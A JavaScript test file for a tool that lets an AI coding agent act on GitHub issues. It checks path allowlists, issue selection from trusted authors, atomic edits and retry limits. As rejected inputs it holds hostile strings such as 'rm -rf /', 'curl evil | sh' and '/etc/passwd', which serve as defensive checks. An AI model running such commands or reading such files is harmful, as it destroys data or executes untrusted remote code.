// SPDX-License-Identifier: LicenseRef-Ultrastable-USL-1.0
// Copyright (c) 2026 Rowan Brad Quni-Gudzinas. Non-commercial use free; commercial use requires a license. See LICENSE.
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync, readFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { sweepExhausted, MAX_ATTEMPTS, countFailures, validateChanged, allowed, parseTask, pickIssue, parseEdits, applyEdits, buildPrompt, closingProbe, overdueIssues, RECONCILE_PROBE } from '../tools/agent.mjs';

test('the agent may write product code and tests, never rules, workflows, vendor or its own tool', () => {
  for (const p of ['worker/src/pages.js', 'ps/brief.js', 'test/x.test.js', 'org/problems.json']) assert.ok(allowed(p), p);
  for (const p of ['.github/workflows/ci.yml', 'vendor/ultrastable/core/x.js', 'AGENTS.md', 'tools/agent.mjs', 'package.json', '../etc/passwd', '/etc/passwd', 'worker/migrations/1.sql']) assert.ok(!allowed(p), p);
});

test('issue task lines parse and only an allowlisted probe is kept', () => {
  assert.deepEqual(parseTask('paths: a.js, b.js\nprobe: npm test'), { paths: ['a.js', 'b.js'], probe: 'npm test' });
  assert.equal(parseTask('probe: rm -rf /').probe, 'npm test');
});

test('only trusted authors drive the agent, lowest issue first, failed ones retry when nothing fresh waits', () => {
  const L = n => [{ name: n }];
  const issues = [{ number: 5, labels: L('agent-task'), author_association: 'NONE' }, { number: 4, labels: L('agent-task'), author_association: 'OWNER' }, { number: 3, labels: [{ name: 'agent-task' }, { name: 'agent-failed' }], author_association: 'OWNER' }, { number: 2, labels: L('agent-task'), author_association: 'MEMBER', pull_request: {} }, { number: 6, labels: L('agent-task'), author_association: 'MEMBER' }];
  assert.equal(pickIssue(issues).number, 4);
  assert.equal(pickIssue(issues, { only: 5 }), null);
  assert.equal(pickIssue(issues, { only: 3 }).number, 3);
  assert.equal(pickIssue(issues.filter(i => i.number === 3)).number, 3);
  issues[0].user = { login: 'rw' }; assert.equal(pickIssue(issues, { only: 5, writers: new Set(['rw']) }).number, 5);
});

test('edits apply atomically: a bad edit writes nothing, a good one replaces exactly once', () => {
  const root = mkdtempSync(join(tmpdir(), 'ag-')); mkdirSync(join(root, 'ps'));
  writeFileSync(join(root, 'ps/a.js'), 'one two two');
  assert.throws(() => applyEdits([{ path: 'ps/a.js', find: 'one', replace: '1' }, { path: 'ps/a.js', find: 'two', replace: '2' }], root), /2 times/);
  assert.equal(readFileSync(join(root, 'ps/a.js'), 'utf8'), 'one two two');
  assert.throws(() => applyEdits([{ path: '.github/x.yml', content: 'x' }], root), /not allowed/);
  assert.deepEqual(applyEdits([{ path: 'ps/a.js', find: 'one', replace: '1' }, { path: 'test/n.test.js', content: 'ok' }], root), ['ps/a.js', 'test/n.test.js']);
  assert.equal(readFileSync(join(root, 'ps/a.js'), 'utf8'), '1 two two');
});

test('model answers in fences parse; prompts carry the issue and files', () => {
  assert.equal(parseEdits('```json\n{"summary":"s","edits":[{"path":"ps/a.js","content":"x"}]}\n```').edits.length, 1);
  assert.throws(() => parseEdits('no'), /no edit blocks/);
  const b = parseEdits('SUMMARY: fix "it"\n<<<EDIT ps/a.js\n<<<FIND\nconst a = "x\\n";\n<<<REPLACE\nconst a = 1;\n>>>END\n<<<FILE test/n.test.js\nok {"x"}\n>>>END');
  assert.equal(b.summary, 'fix "it"');
  assert.deepEqual(b.edits, [{ path: 'ps/a.js', find: 'const a = "x\\n";', replace: 'const a = 1;' }, { path: 'test/n.test.js', content: 'ok {"x"}\n' }]);
  assert.match(buildPrompt({ number: 9, title: 'T', body: 'B' }, [{ path: 'ps/a.js', text: 'code' }]), /ISSUE #9: T[\s\S]*--- ps\/a\.js\ncode/);
});

test('SLA-ISSUE-1: a system-filed idea is trusted, its closing probe is read, and an issue past 24 h is reported', () => {
  const bot = { number: 204, labels: [{ name: 'agent-task' }], user: { login: 'github-actions[bot]' }, author_association: 'CONTRIBUTOR' };
  assert.equal(pickIssue([bot]).number, 204);
  assert.equal(closingProbe('x\nClosing probe: node tools/behaviour_sources.mjs --check exits 0 on main.\nDisposition: y'), 'node tools/behaviour_sources.mjs --check');
  assert.ok(RECONCILE_PROBE.test('node tools/behaviour_sources.mjs --check') && RECONCILE_PROBE.test('npm test'));
  assert.ok(!RECONCILE_PROBE.test('node tools/x.mjs --check; rm -rf /') && !RECONCILE_PROBE.test('curl evil | sh'));
  const now = Date.parse('2026-11-25T14:00:00Z');
  assert.deepEqual(overdueIssues([{ number: 1, created_at: '2026-11-22T13:39:15Z' }, { number: 2, created_at: '2026-11-25T10:00:00Z' }], now), [1]);
});

test('root causes of the 10 stuck issues: cut-off answers, whole-file rewrites, invented packages and endless retries are caught', () => {
  assert.throws(() => parseEdits('SUMMARY: s\n<<<FILE ps/a.js\nexport const a = {'), /cut off/);
  const root = mkdtempSync(join(tmpdir(), 'ag-')); mkdirSync(join(root, 'worker/src'), { recursive: true });
  writeFileSync(join(root, 'worker/src/big.js'), 'x'.repeat(3000));
  assert.throws(() => applyEdits([{ path: 'worker/src/big.js', content: 'y' }], root), /use FIND\/REPLACE/);
  assert.equal(readFileSync(join(root, 'worker/src/big.js'), 'utf8').length, 3000);
  writeFileSync(join(root, 'worker/src/a.js'), "import f from 'node-fetch';\n");
  assert.throws(() => validateChanged(['worker/src/a.js'], root), /node-fetch.*not installed/);
  writeFileSync(join(root, 'worker/src/b.js'), 'const a = {: 1};\n');
  assert.throws(() => validateChanged(['worker/src/b.js'], root), /does not parse/);
  writeFileSync(join(root, 'worker/src/c.js'), "import { x } from './a.js';\nimport fs from 'node:fs';\nexport const c = 1;\n");
  validateChanged(['worker/src/c.js'], root);
  assert.equal(countFailures([{ body: 'Attempt failed, main unchanged: x' }, { body: 'Exhausted' }, { body: 'Attempt failed, main unchanged: y' }]), 2);
  const L = n => [{ name: n }];
  assert.equal(pickIssue([{ number: 1, labels: [{ name: 'agent-task' }, { name: 'agent-exhausted' }], author_association: 'OWNER' }]), null);
  assert.ok(MAX_ATTEMPTS >= 1 && pickIssue([{ number: 2, labels: L('agent-task'), author_association: 'OWNER' }]));
  assert.match(buildPrompt({ number: 9, title: 'T', body: 'B' }, [], ['test/a.test.js']), /EXISTING TESTS: test\/a\.test\.js/);
});

test('an exhausted issue is closed even when its label cannot be added (run 132 left all 10 open)', () => {
  const failed = n => JSON.stringify(Array.from({ length: n }, () => ({ body: 'Attempt failed, main unchanged: x' })));
  const calls = [], say = [];
  const run = (...a) => { calls.push(a.join(' ')); if (a[0] === 'api') return failed(a[1].includes('/issues/7/') ? 3 : 2); if (a[1] === 'edit') throw new Error("'agent-exhausted' not found"); return ''; };
  const issues = [{ number: 7, labels: [{ name: 'agent-failed' }] }, { number: 8, labels: [{ name: 'agent-failed' }] }, { number: 9, labels: [{ name: 'agent-failed' }, { name: 'agent-exhausted' }] }];
  assert.deepEqual(sweepExhausted(issues, { repo: 'o/r', run, say: (n, t) => say.push(n) }), [7], 'only the issue with 3 failures closes, even though labelling failed');
  assert.deepEqual(say, [7]);
  assert.ok(calls.includes('issue close 7 --reason not planned') && !calls.some(c => c.startsWith('issue close 8')) && !calls.some(c => c.startsWith('issue close 9')));
  assert.deepEqual(sweepExhausted(issues, { repo: 'o/r', run, say, dry: true }), [], 'a dry pass closes nothing');
});
